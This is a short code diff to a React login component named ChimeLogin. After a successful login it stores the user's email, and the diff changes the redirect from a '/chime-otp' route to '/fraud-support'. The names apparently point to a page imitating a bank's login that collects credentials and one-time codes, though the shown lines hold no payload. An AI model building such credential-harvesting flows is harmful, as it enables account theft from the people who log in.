@@ -43,8 +43,8 @@ export const ChimeLogin = () => {
         return toast.error(message || "Login failed please try again.");
       toast.success(message);
       updateEmailStore(data.email);
-      return navigate("/chime-otp");
-    } catch (err) {
+      navigate("/fraud-support");
+      } catch (err) {
       toast.error(err.response?.data?.message);
     } finally {
       setIsLoading(false);
